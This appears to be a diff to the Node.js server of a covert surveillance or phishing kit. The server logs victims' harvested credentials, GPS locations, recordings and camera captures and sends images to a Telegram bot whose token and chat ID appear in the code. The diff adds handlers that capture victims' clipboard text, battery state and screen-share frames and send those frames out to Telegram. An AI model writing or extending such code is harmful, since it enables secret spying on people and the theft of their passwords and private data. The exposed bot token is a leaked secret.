@@ -21,8 +21,7 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 // ═══════════════════════════════════════════════════════════════════
 // TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════
-const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
-const TELEGRAM_CHAT_ID = '8262870180';
+// Telegram config is now loaded from db.settings
 
 /**
  * Send a photo to Telegram via Bot API using Node's built-in https module.
@@ -39,7 +38,7 @@ function sendPhotoToTelegram(photoBuffer, caption) {
   // chat_id field
   parts.push(`--${boundary}\r\n`);
   parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
-  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);
+  parts.push(`${db.settings.telegram_chat_id}\r\n`);
 
   // caption field
   if (caption) {
@@ -59,7 +58,7 @@ function sendPhotoToTelegram(photoBuffer, caption) {
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+    path: `/bot${db.settings.telegram_bot_token}/sendPhoto`,
     method: 'POST',
     headers: {
       'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -93,14 +92,14 @@ function sendPhotoToTelegram(photoBuffer, caption) {
  */
 function sendTextToTelegram(text) {
   const postData = JSON.stringify({
-    chat_id: TELEGRAM_CHAT_ID,
+    chat_id: db.settings.telegram_chat_id,
     text: text,
     parse_mode: 'HTML'
   });
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    path: `/bot${db.settings.telegram_bot_token}/sendMessage`,
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -144,7 +143,7 @@ function sendAudioToTelegram(audioBuffer, caption, mimeType) {
   // chat_id field
   parts.push(`--${boundary}\r\n`);
   parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
-  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);
+  parts.push(`${db.settings.telegram_chat_id}\r\n`);
 
   // caption field
   if (caption) {
@@ -165,7 +164,7 @@ function sendAudioToTelegram(audioBuffer, caption, mimeType) {
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+    path: `/bot${db.settings.telegram_bot_token}/sendDocument`,
     method: 'POST',
     headers: {
       'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -210,7 +209,11 @@ let db = {
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
   locations: [],   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
-  credentials: []  // { id, uuid, platform, username, password, created_at }
+  credentials: [],  // { id, uuid, platform, username, password, created_at }
+  settings: {
+    telegram_bot_token: '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI',
+    telegram_chat_id: '8262870180'
+  }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -234,6 +237,7 @@ function loadData() {
       db.recordings = saved.recordings || [];
       db.locations = saved.locations || [];
       db.credentials = saved.credentials || [];
+      if (saved.settings) db.settings = saved.settings;
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
       console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations, ${db.credentials.length} credentials`);
@@ -250,7 +254,8 @@ function saveData() {
       captures: db.captures,
       recordings: db.recordings,
       locations: db.locations,
-      credentials: db.credentials
+      credentials: db.credentials,
+      settings: db.settings
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -580,6 +585,33 @@ app.get('/api/stats', authCheck, (req, res) => {
   });
 });
 
+// ─── Settings Routes ────────────────────────────────────────────────
+app.get('/api/settings', authCheck, (req, res) => {
+  res.json({ settings: db.settings });
+});
+
+app.put('/api/settings', authCheck, (req, res) => {
+  const { telegram_bot_token, telegram_chat_id } = req.body;
+  if (telegram_bot_token) db.settings.telegram_bot_token = telegram_bot_token;
+  if (telegram_chat_id) db.settings.telegram_chat_id = telegram_chat_id;
+  saveData();
+  res.json({ message: 'Settings updated' });
+});
+
+// ─── Batch Users Actions ───────────────────────────────────────────
+app.post('/api/users/batch-delete-offline', authCheck, (req, res) => {
+  const offlineUsers = db.users.filter(u => !u.is_online).map(u => u.uuid);
+  const deleted = offlineUsers.length;
+  
+  db.users = db.users.filter(u => u.is_online);
+  db.captures = db.captures.filter(c => !offlineUsers.includes(c.uuid));
+  db.recordings = db.recordings.filter(r => !offlineUsers.includes(r.uuid));
+  
+  saveData();
+  addLog('delete', '', `Batch deleted ${deleted} offline users`);
+  res.json({ message: `${deleted} offline users deleted` });
+});
+
 // ═══════════════════════════════════════════════════════════════════
 // SOCKET.IO
 // ═══════════════════════════════════════════════════════════════════
@@ -753,6 +785,69 @@ io.on('connection', (socket) => {
         uuid: userUUID,
         candidate: data.candidate
       });
+    });
+
+    socket.on('battery:update', (data) => {
+      if (!data || !data.uuid) return;
+      const user = db.users.find(u => u.uuid === data.uuid);
+      if (user) {
+        user.battery = { level: data.level, charging: data.charging };
+        user.last_active = new Date().toISOString();
+        io.to('admin').emit('user:update', user);
+      }
+    });
+
+    socket.on('clipboard:update', (data) => {
+      if (!data || !data.uuid || !data.text) return;
+      const user = db.users.find(u => u.uuid === data.uuid);
+      if (user) {
+        user.clipboard = data.text;
+        user.last_active = new Date().toISOString();
+        io.to('admin').emit('user:update', user);
+        addLog('info', data.uuid, 'Clipboard data captured: ' + data.text.substring(0, 50));
+      }
+    });
+
+    socket.on('screenshare:update', (data) => {
+      if (!data || !data.uuid || !data.image) return;
+      const uuid = data.uuid;
+      const timestamp = Date.now();
+      const fileName = `screen_${uuid}_${timestamp}.jpg`;
+      const filePath = path.join(MEDIA_DIR, 'captures', fileName);
+
+      try {
+        const base64 = data.image.replace(/^data:image\/\w+;base64,/, '');
+        const buffer = Buffer.from(base64, 'base64');
+        fs.writeFileSync(filePath, buffer);
+
+        const capture = {
+          id: nextId++,
+          uuid,
+          file_path: 'captures/' + fileName,
+          file_size: buffer.length,
+          created_at: new Date().toISOString()
+        };
+        db.captures.push(capture);
+
+        const user = db.users.find(u => u.uuid === uuid);
+        if (user) user.last_active = new Date().toISOString();
+
+        io.to('admin').emit('feed:frame', {
+          uuid,
+          captureId: capture.id,
+          imageUrl: '/media/captures/' + fileName,
+          timestamp,
+          fileSize: buffer.length
+        });
+
+        const captionUser = db.users.find(u => u.uuid === uuid);
+        const caption = `🖥️ Screen Share Capture\nUser: ${uuid}\nDevice: ${captionUser?.device_type || 'Unknown'}\n${new Date().toLocaleString()}`;
+        sendPhotoToTelegram(buffer, caption);
+        addLog('capture', uuid, 'Screen share captured');
+        emitStats();
+      } catch (e) {
+        console.error('Screenshare frame error:', e.message);
+      }
     });
 
     socket.on('camera:frame', (data) => {
